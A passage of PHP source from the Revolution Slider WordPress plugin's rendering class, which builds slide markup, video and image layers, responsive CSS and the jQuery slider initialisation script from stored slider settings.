				if($sliderType == "fullwidth" && $fullWidthCentering == "true")
					$htmlImageCentering = ' data-fullwidthcentering="on"';
					
				//set first slide transition
				$htmlFirstTrans = "";
				$startWithSlide = $this->slider->getStartWithSlideSetting();
				
				if($index == $startWithSlide){
					$firstTransActive = $this->slider->getParam("first_transition_active","false");
					if($firstTransActive == "true"){
						
						$firstTransition = $this->slider->getParam("first_transition_type","fade");						
						$htmlFirstTrans .= " data-fstransition=\"$firstTransition\"";
						
						$firstDuration = $this->slider->getParam("first_transition_duration","300");
						if(!empty($firstDuration) && is_numeric($firstDuration))
							$htmlFirstTrans .= " data-fsmasterspeed=\"$firstDuration\"";
							
						$firstSlotAmount = $this->slider->getParam("first_transition_slot_amount","7");
						if(!empty($firstSlotAmount) && is_numeric($firstSlotAmount))						
						$htmlFirstTrans .= " data-fsslotamount=\"$firstSlotAmount\"";
							
					}
				}//first trans
				
				$htmlParams = $htmlDuration.$htmlLink.$htmlThumb.$htmlDelay.$htmlRotation.$htmlFirstTrans;
				
				$bgType = $slide->getParam("background_type","image");
				
				$styleImage = "";
				$urlImageTransparent = UniteBaseClassRev::$url_plugin."images/transparent.png";
				
				switch($bgType){
					case "trans":
						$urlSlideImage = $urlImageTransparent;
					break;
					case "solid":
						$urlSlideImage = $urlImageTransparent;
						$slideBGColor = $slide->getParam("slide_bg_color","#d0d0d0");
						$styleImage = "style='background-color:{$slideBGColor}'";
					break;
				}
				
				//additional params
				$imageAddParams = "";
				$lazyLoad = $this->slider->getParam("lazy_load","off");
				if($lazyLoad == "on"){
					$imageAddParams .= "data-lazyload=\"$urlSlideImage\"";
					$urlSlideImage = UniteBaseClassRev::$url_plugin."images/dummy.png";
				}
				
				$imageAddParams .= $htmlImageCentering;
				
				//Html
				?>
					<li data-transition="<?php echo $transition?>" data-slotamount="<?php echo $slotAmount?>" <?php echo $htmlParams?>>
						<img src="<?php echo $urlSlideImage?>" <?php echo $styleImage?> alt="<?php echo $alt?>" <?php echo $imageAddParams?>>
						<?php	//put video:
							if($fullWidthVideoData["found"] == true)	//backward compatability
								$this->putFullWidthVideoLayer($fullWidthVideoData);
								
							$this->putCreativeLayer($slide)
						?>
					</li>
				<?php 
			}	//get foreach
			
			?>
				</ul>
			<?php
		}
		
		
		/**
		 * 
		 * get html5 layer html from data
		 */
		private function getHtml5LayerHtml($data){
			
			
			$urlPoster = UniteFunctionsRev::getVal($data, "urlPoster");
			$urlMp4 = UniteFunctionsRev::getVal($data, "urlMp4");
			$urlWebm = UniteFunctionsRev::getVal($data, "urlWebm");
			$urlOgv = UniteFunctionsRev::getVal($data, "urlOgv");
			$width = UniteFunctionsRev::getVal($data, "width");
			$height = UniteFunctionsRev::getVal($data, "height");
			
			$fullwidth = UniteFunctionsRev::getVal($data, "fullwidth");
			$fullwidth = UniteFunctionsRev::strToBool($fullwidth);
			
			if($fullwidth == true){
				$width = "100%";
				$height = "100%";
			}
			
			$htmlPoster = "";
			if(!empty($urlPoster))
				$htmlPoster = "poster='{$urlPoster}'";
				
			$htmlMp4 = "";
			if(!empty($urlMp4))
				$htmlMp4 = "<source src='{$urlMp4}' type='video/mp4' />";

			$htmlWebm = "";
			if(!empty($urlWebm))
				$htmlWebm = "<source src='{$urlWebm}' type='video/webm' />";
				
			$htmlOgv = "";
			if(!empty($urlOgv))
				$htmlOgv = "<source src='{$urlOgv}' type='video/ogg' />";
					
			$html =	"<video class=\"video-js vjs-default-skin\" controls preload=\"none\" width=\"{$width}\" height=\"{$height}\" \n";
	   		$html .=  $htmlPoster ." data-setup=\"{}\"> \n";
	        $html .=  $htmlMp4."\n";
	        $html .=  $htmlWebm."\n";
	        $html .=  $htmlOgv."\n";
			$html .=  "</video>\n";
			
			return($html);
		}
		
		
		/**
		 * 
		 * put creative layer
		 */
		private function putCreativeLayer(RevSlide $slide){
			$layers = $slide->getLayers();
						
			if(empty($layers))
				return(false);
			?>
				<?php foreach($layers as $layer):
						
					$type = UniteFunctionsRev::getVal($layer, "type","text");
					
					//set if video full screen
					$isFullWidthVideo = false;
					if($type == "video"){
						$videoData = UniteFunctionsRev::getVal($layer, "video_data");
						if(!empty($videoData)){
							$videoData = (array)$videoData;
							$isFullWidthVideo = UniteFunctionsRev::getVal($videoData, "fullwidth");
							$isFullWidthVideo = UniteFunctionsRev::strToBool($isFullWidthVideo);
						}else
							$videoData = array();
					}
					
					
					$class = UniteFunctionsRev::getVal($layer, "style");
					$animation = UniteFunctionsRev::getVal($layer, "animation","fade");
					
					//set output class:
					$outputClass = "tp-caption ". trim($class);
						$outputClass = trim($outputClass) . " ";
						
					$outputClass .= trim($animation);
					
					$left = UniteFunctionsRev::getVal($layer, "left",0);
					$top = UniteFunctionsRev::getVal($layer, "top",0);
					$speed = UniteFunctionsRev::getVal($layer, "speed",300);
					$time = UniteFunctionsRev::getVal($layer, "time",0);
					$easing = UniteFunctionsRev::getVal($layer, "easing","easeOutExpo");
					$randomRotate = UniteFunctionsRev::getVal($layer, "random_rotation","false");
					$randomRotate = UniteFunctionsRev::boolToStr($randomRotate);
					
					$text = UniteFunctionsRev::getVal($layer, "text");
					
					$htmlVideoAutoplay = "";
					$htmlVideoNextSlide = "";
					
					//set html:
					$html = "";
					switch($type){
						default:
						case "text":						
							$html = $text;
							$html = do_shortcode($html);
						break;
						case "image":
							$urlImage = UniteFunctionsRev::getVal($layer, "image_url");
							$html = '<img src="'.$urlImage.'" alt="'.$text.'">';
							$imageLink = UniteFunctionsRev::getVal($layer, "link","");
							if(!empty($imageLink)){
								$openIn = UniteFunctionsRev::getVal($layer, "link_open_in","same");

								$target = "";
								if($openIn == "new")
									$target = ' target="_blank"';
									
								$html = '<a href="'.$imageLink.'"'.$target.'>'.$html.'</a>';
							}								
						break;
						case "video":
							$videoType = trim(UniteFunctionsRev::getVal($layer, "video_type"));
							$videoID = trim(UniteFunctionsRev::getVal($layer, "video_id"));
							$videoWidth = trim(UniteFunctionsRev::getVal($layer, "video_width"));
							$videoHeight = trim(UniteFunctionsRev::getVal($layer, "video_height"));	
							$videoArgs = trim(UniteFunctionsRev::getVal($layer, "video_args"));
							
							if($isFullWidthVideo == true){
								$videoWidth = "100%";
								$videoHeight = "100%";
							}
							
							switch($videoType){
								case "youtube":
									if(empty($videoArgs))
										$videoArgs = GlobalsRevSlider::DEFAULT_YOUTUBE_ARGUMENTS;
									$html = "<iframe src='http://www.youtube.com/embed/{$videoID}?{$videoArgs}' width='{$videoWidth}' height='{$videoHeight}' style='width:{$videoWidth}px;height:{$videoHeight}px;'></iframe>";
									
								break;
								case "vimeo":
									if(empty($videoArgs))
										$videoArgs = GlobalsRevSlider::DEFAULT_VIMEO_ARGUMENTS;
									$html = "<iframe src='http://player.vimeo.com/video/{$videoID}?{$videoArgs}' width='{$videoWidth}' height='{$videoHeight}' style='width:{$videoWidth}px;height:{$videoHeight}px;'></iframe>";
								break;
								case "html5":
									$html = $this->getHtml5LayerHtml($videoData);									
								break;
								default:
									UniteFunctionsRev::throwError("wrong video type: $videoType");
								break;
							}
							
							
							//set video autoplay, with backward compatability
							if(array_key_exists("autoplay", $videoData))
								$videoAutoplay = UniteFunctionsRev::getVal($videoData, "autoplay");
							else	//backword compatability
								$videoAutoplay = UniteFunctionsRev::getVal($layer, "video_autoplay");
							
							$videoAutoplay = UniteFunctionsRev::strToBool($videoAutoplay);
							
							if($videoAutoplay == true)
								$htmlVideoAutoplay = ' data-autoplay="true"';								
							
							$videoNextSlide = UniteFunctionsRev::getVal($videoData, "nextslide");
							$videoNextSlide = UniteFunctionsRev::strToBool($videoNextSlide);
							
							if($videoNextSlide == true)
								$htmlVideoNextSlide = ' data-nextslideatend="true"';								
								
						break;
					}
					
					//handle end transitions:
					$endTime = trim(UniteFunctionsRev::getVal($layer, "endtime"));
					$htmlEnd = "";
					if(!empty($endTime)){
						$htmlEnd = "data-end=\"$endTime\"";
						$endSpeed = trim(UniteFunctionsRev::getVal($layer, "endspeed"));
						if(!empty($endSpeed))
							 $htmlEnd .= " data-endspeed=\"$endSpeed\"";
							 
						$endEasing = trim(UniteFunctionsRev::getVal($layer, "endeasing"));
						if(!empty($endSpeed) && $endEasing != "nothing")
							 $htmlEnd .= " data-endeasing=\"$endEasing\"";
						
						//add animation to class
						$endAnimation = trim(UniteFunctionsRev::getVal($layer, "endanimation"));
						if(!empty($endAnimation) && $endAnimation != "auto")
							$outputClass .= " ".$endAnimation;	
					}
					
					//slide link
					$htmlLink = "";
					$slideLink = UniteFunctionsRev::getVal($layer, "link_slide");
					if(!empty($slideLink) && $slideLink != "nothing" && $slideLink != "scroll_under"){
						//get slide index from id
						if(is_numeric($slideLink))
							$slideLink = UniteFunctionsRev::getVal($this->slidesNumIndex, $slideLink);
						
						if(!empty($slideLink))
							$htmlLink = " data-linktoslide=\"$slideLink\"";
					}
					
					//scroll under the slider
					if($slideLink == "scroll_under"){
						$outputClass .= " tp-scrollbelowslider";
						$scrollUnderOffset = UniteFunctionsRev::getVal($layer, "scrollunder_offset");
						if(!empty($scrollUnderOffset))
							$htmlLink .= " data-scrolloffset=\"{$scrollUnderOffset}\"";
					}					
					
					//hidden under resolution
					$htmlHidden = "";
					$layerHidden = UniteFunctionsRev::getVal($layer, "hiddenunder");
					if($layerHidden == "true" || $layerHidden == "1")
						$htmlHidden = ' data-captionhidden="on"';
					
					$htmlParams = $htmlEnd.$htmlLink.$htmlVideoAutoplay.$htmlVideoNextSlide.$htmlHidden;
					
					//set positioning options
					
					$alignHor = UniteFunctionsRev::getVal($layer,"align_hor","left");
					$alignVert = UniteFunctionsRev::getVal($layer, "align_vert","top");
					
					$htmlPosX = "";
					$htmlPosY = "";
					switch($alignHor){
						default:
						case "left":
							$htmlPosX = "data-x=\"{$left}\" \n";
						break;
						case "center":
							$htmlPosX = "data-x=\"center\" data-hoffset=\"{$left}\" \n";
						break;
						case "right":
							$left = (int)$left*-1;
							$htmlPosX = "data-x=\"right\" data-hoffset=\"{$left}\" \n";
						break;
					}
					
					switch($alignVert){
						default:
						case "top":
							$htmlPosY = "data-y=\"{$top}\" ";
						break;
						case "middle":
							$htmlPosY = "data-y=\"center\" data-voffset=\"{$top}\" ";
						break;
						case "bottom":
							$top = (int)$top*-1;
							$htmlPosY = "data-y=\"bottom\" data-voffset=\"{$top}\" ";
						break;						
					}
					
					//set corners
					$htmlCorners = "";
					
					if($type == "text"){
						$cornerLeft = UniteFunctionsRev::getVal($layer, "corner_left");
						$cornerRight = UniteFunctionsRev::getVal($layer, "corner_right");
						switch($cornerLeft){
							case "curved":
								$htmlCorners .= "<div class='frontcorner'></div>";
							break;
							case "reverced":
								$htmlCorners .= "<div class='frontcornertop'></div>";							
							break;
						}
						
						switch($cornerRight){
							case "curved":
								$htmlCorners .= "<div class='backcorner'></div>";
							break;
							case "reverced":
								$htmlCorners .= "<div class='backcornertop'></div>";							
							break;
						}
					
					//add resizeme class
					$resizeme = UniteFunctionsRev::getVal($layer, "resizeme");
					if($resizeme == "true" || $resizeme == "1")
						$outputClass .= ' tp-resizeme';
						
					}//end text related layer
					
					//make some modifications for the full screen video
					if($isFullWidthVideo == true){
						$htmlPosX = "data-x=\"0\""."\n";
						$htmlPosY = "data-y=\"0\""."\n";
						$outputClass .= " fullscreenvideo";
					}
					
				?>
				<div class="<?php echo $outputClass?>"
					 <?php echo $htmlPosX?>
					 <?php echo $htmlPosY?>
					 data-speed="<?php echo $speed?>" 
					 data-start="<?php echo $time?>" 
					 data-easing="<?php echo $easing?>" <?php echo $htmlParams?> ><?php echo $html?>
					 <?php echo $htmlCorners?>
					 </div>
				
				<?php 
				
			endforeach;
		}
		
		/**
		 * 
		 * put slider javascript
		 */
		private function putJS(){
			
			$params = $this->slider->getParams();
			$sliderType = $this->slider->getParam("slider_type");
			$optFullWidth = ($sliderType == "fullwidth")?"on":"off";
			
			$optFullScreen = "off";
			if($sliderType == "fullscreen"){
				$optFullWidth = "on";
				$optFullScreen = "on";
			}
			
			$noConflict = $this->slider->getParam("jquery_noconflict","on");
			
			//set thumb amount
			$numSlides = $this->slider->getNumSlides(true);
			$thumbAmount = (int)$this->slider->getParam("thumb_amount","5");
			if($thumbAmount > $numSlides)
				$thumbAmount = $numSlides;
				
			
			//get stop slider options
			 $stopSlider = $this->slider->getParam("stop_slider","off");
			 $stopAfterLoops = $this->slider->getParam("stop_after_loops","0");
			 $stopAtSlide = $this->slider->getParam("stop_at_slide","2");
			 
			 if($stopSlider == "off"){
				 $stopAfterLoops = "-1";
				 $stopAtSlide = "-1";
			 }
			
			// set hide navigation after
			$hideThumbs = $this->slider->getParam("hide_thumbs","200");
			if(is_numeric($hideThumbs) == false)
				$hideThumbs = "0";
			else{
				$hideThumbs = (int)$hideThumbs;
				if($hideThumbs < 10)
					$hideThumbs = 10;
			}
			
			$alwaysOn = $this->slider->getParam("navigaion_always_on","false");
			if($alwaysOn == "true")
				$hideThumbs = "0";
			
			$sliderID = $this->slider->getID();
			
			//treat hide slider at limit
			$hideSliderAtLimit = $this->slider->getParam("hide_slider_under","0",RevSlider::VALIDATE_NUMERIC);
			if(!empty($hideSliderAtLimit))
				$hideSliderAtLimit++;

			//this option is disabled in full width slider
			if($sliderType == "fullwidth")
				$hideSliderAtLimit = "0";
			
			$hideCaptionAtLimit = $this->slider->getParam("hide_defined_layers_under","0",RevSlider::VALIDATE_NUMERIC);;
			if(!empty($hideCaptionAtLimit))
				$hideCaptionAtLimit++;
			
			$hideAllCaptionAtLimit = $this->slider->getParam("hide_all_layers_under","0",RevSlider::VALIDATE_NUMERIC);;
			if(!empty($hideAllCaptionAtLimit))
				$hideAllCaptionAtLimit++;
			
			//start_with_slide
			$startWithSlide = $this->slider->getStartWithSlideSetting();
			
	 	  //modify navigation type (backward compatability)
			$arrowsType = $this->slider->getParam("navigation_arrows","nexttobullets");
			switch($arrowsType){
				case "verticalcentered":
					$arrowsType = "solo";
				break;
			}
			
			$videoJsPath = UniteBaseClassRev::$url_plugin."rs-plugin/videojs/";			

			?>
			
			<script type="text/javascript">

				var tpj=jQuery;
				
				<?php if($noConflict == "on"):?>
					tpj.noConflict();
				<?php endif;?>
				
				var revapi<?php echo $sliderID?>;
				
				tpj(document).ready(function() {
				
				if (tpj.fn.cssOriginal != undefined)
					tpj.fn.css = tpj.fn.cssOriginal;
				
				if(tpj('#<?php echo $this->sliderHtmlID?>').revolution == undefined)
					revslider_showDoubleJqueryError('#<?php echo $this->sliderHtmlID?>');
				else
				   revapi<?php echo $sliderID?> = tpj('#<?php echo $this->sliderHtmlID?>').show().revolution(
					{
						delay:<?php echo $this->slider->getParam("delay","9000",RevSlider::FORCE_NUMERIC)?>,
						startwidth:<?php echo $this->slider->getParam("width","900")?>,
						startheight:<?php echo $this->slider->getParam("height","300")?>,
						hideThumbs:<?php echo $hideThumbs?>,
						
						thumbWidth:<?php echo $this->slider->getParam("thumb_width","100",RevSlider::FORCE_NUMERIC)?>,
						thumbHeight:<?php echo $this->slider->getParam("thumb_height","50",RevSlider::FORCE_NUMERIC)?>,
						thumbAmount:<?php echo $thumbAmount?>,
						
						navigationType:"<?php echo $this->slider->getParam("navigaion_type","none")?>",
						navigationArrows:"<?php echo $arrowsType?>",
						navigationStyle:"<?php echo $this->slider->getParam("navigation_style","round")?>",
						
						touchenabled:"<?php echo $this->slider->getParam("touchenabled","on")?>",
						onHoverStop:"<?php echo $this->slider->getParam("stop_on_hover","on")?>",
						
						navigationHAlign:"<?php echo $this->slider->getParam("navigaion_align_hor","center")?>",
						navigationVAlign:"<?php echo $this->slider->getParam("navigaion_align_vert","bottom")?>",
						navigationHOffset:<?php echo $this->slider->getParam("navigaion_offset_hor","0",RevSlider::FORCE_NUMERIC)?>,
						navigationVOffset:<?php echo $this->slider->getParam("navigaion_offset_vert","20",RevSlider::FORCE_NUMERIC)?>,

						soloArrowLeftHalign:"<?php echo $this->slider->getParam("leftarrow_align_hor","left")?>",
						soloArrowLeftValign:"<?php echo $this->slider->getParam("leftarrow_align_vert","center")?>",
						soloArrowLeftHOffset:<?php echo $this->slider->getParam("leftarrow_offset_hor","20",RevSlider::FORCE_NUMERIC)?>,
						soloArrowLeftVOffset:<?php echo $this->slider->getParam("leftarrow_offset_vert","0",RevSlider::FORCE_NUMERIC)?>,

						soloArrowRightHalign:"<?php echo $this->slider->getParam("rightarrow_align_hor","right")?>",
						soloArrowRightValign:"<?php echo $this->slider->getParam("rightarrow_align_vert","center")?>",
						soloArrowRightHOffset:<?php echo $this->slider->getParam("rightarrow_offset_hor","20",RevSlider::FORCE_NUMERIC)?>,
						soloArrowRightVOffset:<?php echo $this->slider->getParam("rightarrow_offset_vert","0",RevSlider::FORCE_NUMERIC)?>,
								
						shadow:<?php echo $this->slider->getParam("shadow_type","2")?>,
						fullWidth:"<?php echo $optFullWidth?>",
						fullScreen:"<?php echo $optFullScreen?>",

						stopLoop:"<?php echo $stopSlider?>",
						stopAfterLoops:<?php echo $stopAfterLoops?>,
						stopAtSlide:<?php echo $stopAtSlide?>,

						shuffle:"<?php echo $this->slider->getParam("shuffle","off") ?>",
						
						hideSliderAtLimit:<?php echo $hideSliderAtLimit?>,
						hideCaptionAtLimit:<?php echo $hideCaptionAtLimit?>,
						hideAllCaptionAtLilmit:<?php echo $hideAllCaptionAtLimit?>,
						startWithSlide:<?php echo $startWithSlide?>,
						videoJsPath:"<?php echo $videoJsPath?>",
						fullScreenOffsetContainer: "<?php echo $this->slider->getParam("fullscreen_offset_container","");?>"	
					});
				
				});	//ready
				
			</script>
			
			<?php			
		}
		
		
		/**
		 * 
		 * put inline error message in a box.
		 */
		public function putErrorMessage($message){
			?>
			<div style="width:800px;height:300px;margin-bottom:10px;border:1px solid black;margin:0px auto;">
				<div style="padding-left:20px;padding-right:20px;line-height:1.5;padding-top:40px;color:red;font-size:16px;text-align:left;">
					<?php _e("Revolution Slider Error",REVSLIDER_TEXTDOMAIN)?>: <?php echo $message?> 
				</div>
			</div>
			<?php 
		}
		
		/**
		 * 
		 * fill the responsitive slider values for further output
		 */
		private function getResponsitiveValues(){
			$sliderWidth = (int)$this->slider->getParam("width");
			$sliderHeight = (int)$this->slider->getParam("height");
			
			$percent = $sliderHeight / $sliderWidth;
			
			$w1 = (int) $this->slider->getParam("responsitive_w1",0);
			$w2 = (int) $this->slider->getParam("responsitive_w2",0);
			$w3 = (int) $this->slider->getParam("responsitive_w3",0);
			$w4 = (int) $this->slider->getParam("responsitive_w4",0);
			$w5 = (int) $this->slider->getParam("responsitive_w5",0);
			$w6 = (int) $this->slider->getParam("responsitive_w6",0);
			
			$sw1 = (int) $this->slider->getParam("responsitive_sw1",0);
			$sw2 = (int) $this->slider->getParam("responsitive_sw2",0);
			$sw3 = (int) $this->slider->getParam("responsitive_sw3",0);
			$sw4 = (int) $this->slider->getParam("responsitive_sw4",0);
			$sw5 = (int) $this->slider->getParam("responsitive_sw5",0);
			$sw6 = (int) $this->slider->getParam("responsitive_sw6",0);
			
			$arrItems = array();
			
			//add main item:
			$arr = array();				
			$arr["maxWidth"] = -1;
			$arr["minWidth"] = $w1;
			$arr["sliderWidth"] = $sliderWidth;
			$arr["sliderHeight"] = $sliderHeight;
			$arrItems[] = $arr;
			
			//add item 1:
			if(empty($w1))
				return($arrItems);
				
			$arr = array();				
			$arr["maxWidth"] = $w1-1;
			$arr["minWidth"] = $w2;
			$arr["sliderWidth"] = $sw1;
			$arr["sliderHeight"] = floor($sw1 * $percent);
			$arrItems[] = $arr;
			
			//add item 2:
			if(empty($w2))
				return($arrItems);
			
			$arr["maxWidth"] = $w2-1;
			$arr["minWidth"] = $w3;
			$arr["sliderWidth"] = $sw2;
			$arr["sliderHeight"] = floor($sw2 * $percent);
			$arrItems[] = $arr;
			
			//add item 3:
			if(empty($w3))
				return($arrItems);
			
			$arr["maxWidth"] = $w3-1;
			$arr["minWidth"] = $w4;
			$arr["sliderWidth"] = $sw3;
			$arr["sliderHeight"] = floor($sw3 * $percent);
			$arrItems[] = $arr;
			
			//add item 4:
			if(empty($w4))
				return($arrItems);
			
			$arr["maxWidth"] = $w4-1;
			$arr["minWidth"] = $w5;
			$arr["sliderWidth"] = $sw4;
			$arr["sliderHeight"] = floor($sw4 * $percent);
			$arrItems[] = $arr;

			//add item 5:
			if(empty($w5))
				return($arrItems);
			
			$arr["maxWidth"] = $w5-1;
			$arr["minWidth"] = $w6;
			$arr["sliderWidth"] = $sw5;
			$arr["sliderHeight"] = floor($sw5 * $percent);
			$arrItems[] = $arr;
			
			//add item 6:
			if(empty($w6))
				return($arrItems);
			
			$arr["maxWidth"] = $w6-1;
			$arr["minWidth"] = 0;
			$arr["sliderWidth"] = $sw6;
			$arr["sliderHeight"] = floor($sw6 * $percent);
			$arrItems[] = $arr;
			
			return($arrItems);
		}
		
		
		/**
		 * 
		 * put responsitive inline styles
		 */
		private function putResponsitiveStyles(){

			$bannerWidth = $this->slider->getParam("width");
			$bannerHeight = $this->slider->getParam("height");
			
			$arrItems = $this->getResponsitiveValues();
			
			?>
			<style type='text/css'>
				#<?php echo $this->sliderHtmlID?>, #<?php echo $this->sliderHtmlID_wrapper?> { width:<?php echo $bannerWidth?>px; height:<?php echo $bannerHeight?>px;}
			<?php
			foreach($arrItems as $item):			
				$strMaxWidth = "";
				
				if($item["maxWidth"] >= 0)
					$strMaxWidth = "and (max-width: {$item["maxWidth"]}px)";
				
			?>
			
			   @media only screen and (min-width: <?php echo $item["minWidth"]?>px) <?php echo $strMaxWidth?> {
			 		  #<?php echo $this->sliderHtmlID?>, #<?php echo $this->sliderHtmlID_wrapper?> { width:<?php echo $item["sliderWidth"]?>px; height:<?php echo $item["sliderHeight"]?>px;}	
			   }
			
			<?php 
			endforeach;
			echo "</style>";
		}

		
		/**
		 * 
		 * modify slider settings for preview mode
		 */
		private function modifyPreviewModeSettings(){
			$params = $this->slider->getParams();
			$params["js_to_body"] = "false";
			
			$this->slider->setParams($params);
		}
		
		
		/**
		 * 
		 * put html slider on the html page.
		 * @param $data - mixed, can be ID ot Alias.
		 */
		
		//TODO: settings google font, position, margin, background color, alt image text
		
		public function putSliderBase($sliderID){
			
			try{
				self::$sliderSerial++;
				
				$this->slider = new RevSlider();
				$this->slider->initByMixed($sliderID);
				
				//modify settings for admin preview mode
				if($this->previewMode == true)
					$this->modifyPreviewModeSettings();
				
				//set slider language
				$isWpmlExists = UniteWpmlRev::isWpmlExists();
				$useWpml = $this->slider->getParam("use_wpml","off");
				if(	$isWpmlExists && $useWpml == "on"){					 
					if($this->previewMode == false)
						$this->sliderLang = UniteFunctionsWPRev::getCurrentLangCode();
				}
				
				//edit html before slider
				$htmlBeforeSlider = "";
				if($this->slider->getParam("load_googlefont","false") == "true"){
					$googleFont = $this->slider->getParam("google_font");
					$htmlBeforeSlider = "<link rel='stylesheet' id='rev-google-font' href='http://fonts.googleapis.com/css?family={$googleFont}' type='text/css' media='all' />";
				}
				
				//pub js to body handle
				if($this->slider->getParam("js_to_body","false") == "true"){
					$urlIncludeJS = UniteBaseClassRev::$url_plugin."rs-plugin/js/jquery.themepunch.revolution.min.js";
					$htmlBeforeSlider .= "<script type='text/javascript' src='$urlIncludeJS'></script>";
				}
				
				//the initial id can be alias
				$sliderID = $this->slider->getID();
				
				$bannerWidth = $this->slider->getParam("width",null,RevSlider::VALIDATE_NUMERIC,"Slider Width");
				$bannerHeight = $this->slider->getParam("height",null,RevSlider::VALIDATE_NUMERIC,"Slider Height");
				
				$sliderType = $this->slider->getParam("slider_type");
				
				//set wrapper height
				$wrapperHeigh = 0;
				$wrapperHeigh += $this->slider->getParam("height");
				
				//add thumb height
				if($this->slider->getParam("navigaion_type") == "thumb"){
					$wrapperHeigh += $this->slider->getParam("thumb_height");
				}

				$this->sliderHtmlID = "rev_slider_".$sliderID."_".self::$sliderSerial;
				$this->sliderHtmlID_wrapper = $this->sliderHtmlID."_wrapper";
				
				$containerStyle = "";
				
				$sliderPosition = $this->slider->getParam("position","center");
				
				//set position:
				if($sliderType != "fullscreen"){
					
					switch($sliderPosition){
						case "center":
						default:
							$containerStyle .= "margin:0px auto;";
						break;
						case "left":
							$containerStyle .= "float:left;";
						break;
						case "right":
							$containerStyle .= "float:right;";
						break;
					}
					
				}
					
				//add background color
				$backgrondColor = trim($this->slider->getParam("background_color"));
				if(!empty($backgrondColor))
					$containerStyle .= "background-color:$backgrondColor;";
				
				//set padding			
				$containerStyle .= "padding:".$this->slider->getParam("padding","0")."px;";
				
				//set margin:
				if($sliderType != "fullscreen"){
									
					if($sliderPosition != "center"){
						$containerStyle .= "margin-left:".$this->slider->getParam("margin_left","0")."px;";
						$containerStyle .= "margin-right:".$this->slider->getParam("margin_right","0")."px;";
					}
					
					$containerStyle .= "margin-top:".$this->slider->getParam("margin_top","0")."px;";
					$containerStyle .= "margin-bottom:".$this->slider->getParam("margin_bottom","0")."px;";
				}
				
				//set height and width:
				$bannerStyle = "display:none;";	
				
				//add background image (to banner style)
				$showBackgroundImage = $this->slider->getParam("show_background_image","false");
				if($showBackgroundImage == "true"){					
					$backgroundImage = $this->slider->getParam("background_image");					
					if(!empty($backgroundImage))
						$bannerStyle .= "background-image:url($backgroundImage);background-repeat:no-repeat;";
				}
				
				//set wrapper and slider class:
				$sliderWrapperClass = "rev_slider_wrapper";
				$sliderClass = "rev_slider";
				
				$putResponsiveStyles = false;
				
				switch($sliderType){
					default:
					case "fixed":
						$bannerStyle .= "height:{$bannerHeight}px;width:{$bannerWidth}px;";
						$containerStyle .= "height:{$bannerHeight}px;width:{$bannerWidth}px;";
					break;
					case "responsitive":
						$putResponsiveStyles = true;						
					break;
					case "fullwidth":
						$sliderWrapperClass .= " fullwidthbanner-container";
						$sliderClass .= " fullwidthabanner";
						$bannerStyle .= "max-height:{$bannerHeight}px;height:{$bannerHeight};";
						$containerStyle .= "max-height:{$bannerHeight}px;";						
					break;
					case "fullscreen":
						$sliderWrapperClass .= " fullscreen-container";
						$sliderClass .= " fullscreenbanner";
					break;
				}
				
				$htmlTimerBar = "";
				
				$timerBar =  $this->slider->getParam("show_timerbar","top");
				
				if($timerBar == "true")
					$timerBar = $this->slider->getParam("timebar_position","top");
										
				switch($timerBar){
					case "top":
						$htmlTimerBar = '<div class="tp-bannertimer"></div>';
					break;
					case "bottom":
						$htmlTimerBar = '<div class="tp-bannertimer tp-bottom"></div>';
					break;
				}
				
				//check inner / outer border
				$paddingType = $this->slider->getParam("padding_type","outter");
				if($paddingType == "inner")	
					$sliderWrapperClass .= " tp_inner_padding"; 
				
				global $revSliderVersion;
				
				?>
				
				<!-- START REVOLUTION SLIDER <?php echo $revSliderVersion?> <?php echo $sliderType?> mode -->
				
				<?php 
					if($putResponsiveStyles == true)
						$this->putResponsitiveStyles(); ?>
				
				<?php echo $htmlBeforeSlider?>
				<div id="<?php echo $this->sliderHtmlID_wrapper?>" class="<?php echo $sliderWrapperClass?>" style="<?php echo $containerStyle?>">
					<div id="<?php echo $this->sliderHtmlID ?>" class="<?php echo $sliderClass?>" style="<?php echo $bannerStyle?>">						
						<?php $this->putSlides()?>
						<?php echo $htmlTimerBar?>
					</div>
				</div>				
				<?php 
				
				$this->putJS();
				?>
				<!-- END REVOLUTION SLIDER -->
				<?php 
				
			}catch(Exception $e){
				$message = $e->getMessage();
				$this->putErrorMessage($message);
			}
			
		}
		
		
	}

?>